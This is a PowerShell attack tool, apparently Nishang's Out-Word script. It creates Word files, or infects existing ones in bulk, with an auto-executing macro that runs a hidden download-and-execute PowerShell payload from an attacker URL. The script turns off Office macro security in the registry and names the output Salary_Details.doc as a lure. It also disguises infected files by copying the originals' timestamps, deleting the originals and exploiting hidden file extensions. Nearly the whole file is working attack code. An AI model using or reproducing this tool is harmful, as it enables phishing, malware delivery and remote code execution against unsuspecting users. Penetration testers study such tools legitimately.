function Out-Word
{
<#
.SYNOPSIS
Nishang Script which can generate and "infect" existing word files with an auto executable macro. 

.DESCRIPTION
The script can create as well as "infect" existing word files with an auto executable macro. Powershell payloads
could be exeucted using the genereated files. If a folder is passed to the script it can insert macro in all existing word
files in the folder. With the Recurse switch, sub-folders can also be included. 
For existing files, a new macro enabled doc file is generated from a docx file and for existing .doc files, the macro code is inserted.
LastWriteTime of the docx file is set to the newly generated doc file. If the RemoveDocx switch is enabled, the 
original docx is removed and the data in it is lost.

.PARAMETER Payload
Payload which you want execute on the target.

.PARAMETER PayloadURL
URL of the powershell script which would be executed on the target.

.PARAMETER Arguments
Arguments to the powershell script to be executed on the target.

.PARAMETER WordFileDir
The directory which contains MS Word files which are to be "infected".

.PARAMETER OutputFile
The path for the output Word file. Default is Salary_Details.doc in the current directory.

.PARAMETER Recurse
Recursively look for Word files in the WordFileDir

.PARAMETER RemoveDocx
When using the WordFileDir to "infect" files in a directory, remove the original ones after creating the infected ones.

.PARAMETER RemainSafe
Use this switch to turn on Macro Security on your machine after using Out-Word.

.EXAMPLE
PS > Out-Word -Payload "powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c Get-Process"

Use above command to provide your own payload to be executed from macro. A file named "Salary_Details.doc" would be generated
in the current directory.

.EXAMPLE
PS > Out-Word -PayloadURL http://yourwebserver.com/evil.ps1

Use above when you want to use the default payload, which is a powershell download and execute one-liner. A file 
named "Salary_Details.doc" would be generated in user's temp directory.

.EXAMPLE
PS > Out-Word -PayloadURL http://yourwebserver.com/evil.ps1 -Arguments Evil

Use above when you want to use the default payload, which is a powershell download and execute one-liner.
The Arugment parameter allows to pass arguments to the downloaded script.

.EXAMPLE
PS > Out-Word -PayloadURL http://yourwebserver.com/evil.ps1 -OutputFile C:\docfiles\Generated.doc

In above, the output file would be saved to the given path.

.EXAMPLE
PS > Out-Word -PayloadURL http://yourwebserver.com/evil.ps1 -WordFileDir C:\docfiles\

In above, in the C:\docfiles directory, macro enabled .doc files would be created for all the .docx files, with the same name
and same Last MOdified Time.

.EXAMPLE
PS > Out-Word -PayloadURL http://yourwebserver.com/evil.ps1 -WordFileDir C:\docfiles\ -Recurse

The above command would search recursively for .docx files in C:\docfiles.

.EXAMPLE
PS > Out-Word -PayloadURL http://yourwebserver.com/evil.ps1 -WordFileDir C:\docfiles\ -Recurse -RemoveDocx

The above command would search recursively for .docx files in C:\docfiles, generate macro enabled .doc files and
delete the original files.

.EXAMPLE
PS > Out-Word -PayloadURL http://yourwebserver.com/evil.ps1 -RemainSafe

Out-Word turns off Macro Security. Use -RemainSafe to turn it back on.


.LINK
http://www.labofapenetrationtester.com/2014/11/powershell-for-client-side-attacks.html
https://github.com/samratashok/nishang
#>

    [CmdletBinding()] Param(
        
        [Parameter(Position=0, Mandatory = $False)]
        [String]
        $Payload,
        
        [Parameter(Position=1, Mandatory = $False)]
        [String]
        $PayloadURL,

        [Parameter(Position=2, Mandatory = $False)]
        [String]
        $Arguments,
        
        [Parameter(Position=3, Mandatory = $False)]
        [String]
        $WordFileDir,
        
        [Parameter(Position=4, Mandatory = $False)]
        [String]
        $OutputFile="$pwd\Salary_Details.doc",

        
        [Parameter(Position=5, Mandatory = $False)]
        [Switch]
        $Recurse,
        
        [Parameter(Position=6, Mandatory = $False)]
        [Switch]
        $RemoveDocx,

        [Parameter(Position=7, Mandatory = $False)]
        [Switch]
        $RemainSafe
    )
    
    $Word = New-Object -ComObject Word.Application
    $WordVersion = $Word.Version

    #Check for Office 2007 or Office 2003
    if (($WordVersion -eq "12.0") -or  ($WordVersion -eq "11.0"))
    {
        $Word.DisplayAlerts = $False
    }
    else
    {
        $Word.DisplayAlerts = "wdAlertsNone"
    }    
    #Turn off Macro Security
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\word\Security" -Name AccessVBOM -Value 1 -PropertyType DWORD -Force | Out-Null
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\word\Security" -Name VBAWarnings -Value 1 -PropertyType DWORD -Force | Out-Null

    if(!$Payload)
    {
        $Payload = "powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c IEX ((New-Object Net.WebClient).DownloadString('$PayloadURL'));$Arguments"
    }
    #Macro Code
    #Macro code from here http://enigma0x3.wordpress.com/2014/01/11/using-a-powershell-payload-in-a-client-side-attack/
    $code = @"
    Sub Document_Open()
    Execute

    End Sub


         Public Function Execute() As Variant
            Const HIDDEN_WINDOW = 0
            strComputer = "."
            Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
         
            Set objStartup = objWMIService.Get("Win32_ProcessStartup")
            Set objConfig = objStartup.SpawnInstance_
            objConfig.ShowWindow = HIDDEN_WINDOW
            Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
            objProcess.Create "$Payload", Null, objConfig, intProcessID
         End Function
"@

  
    if ($WordFileDir)
    {
        $WordFiles = Get-ChildItem $WordFileDir\* -Include *.doc,*.docx
        if ($Recurse -eq $True)
        {
            $WordFiles = Get-ChildItem -Recurse $WordFileDir\* -Include *.doc,*.docx
        }
        ForEach ($WordFile in $WordFiles)
        {
            $Word = New-Object -ComObject Word.Application
            $Word.DisplayAlerts = $False
            $Doc = $Word.Documents.Open($WordFile.FullName)
            $DocModule = $Doc.VBProject.VBComponents.Item(1)
            $DocModule.CodeModule.AddFromString($code)
            if ($WordFile.Extension -eq ".doc")
            {
                $Savepath = $WordFile.FullName
            }
            $Savepath = $WordFile.DirectoryName + "\" + $Wordfile.BaseName + ".doc"
            #Append .doc to the original file name if file extensions are hidden for known file types.
            if ((Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced).HideFileExt -eq "1")
            {
                $Savepath = $WordFile.FullName + ".doc"
            }
            if (($WordVersion -eq "12.0") -or  ($WordVersion -eq "11.0"))
            {
                $Doc.Saveas($SavePath, 0)
            }
            else
            {
                $Doc.Saveas([ref]$SavePath, 0)
            } 
            Write-Output "Saved to file $SavePath"
            $Doc.Close()
            $LastModifyTime = $WordFile.LastWriteTime
            $FinalDoc = Get-ChildItem $Savepath
            $FinalDoc.LastWriteTime = $LastModifyTime
            if ($RemoveDocx -eq $True)
            {
                Write-Output "Deleting $($WordFile.FullName)"
                Remove-Item -Path $WordFile.FullName
            }
            $Word.quit()
            [System.Runtime.Interopservices.Marshal]::ReleaseComObject($Word)
        }
    }
    else
    {
        $Doc = $Word.documents.add()
        $DocModule = $Doc.VBProject.VBComponents.Item(1)
        $DocModule.CodeModule.AddFromString($code)
        if (($WordVersion -eq "12.0") -or  ($WordVersion -eq "11.0"))
        {
            $Doc.Saveas($OutputFile, 0)
        }
        else
        {
            $Doc.Saveas([ref]$OutputFile, [ref]0)
        } 
        Write-Output "Saved to file $OutputFile"
        $Doc.Close()
        $Word.quit()
        [System.Runtime.Interopservices.Marshal]::ReleaseComObject($Word)
    }

    if ($RemainSafe -eq $True)
    {
        #Turn on Macro Security
        New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\word\Security" -Name AccessVBOM -Value 0 -Force | Out-Null
        New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\word\Security" -Name VBAWarnings -Value 0 -Force | Out-Null
    }
}
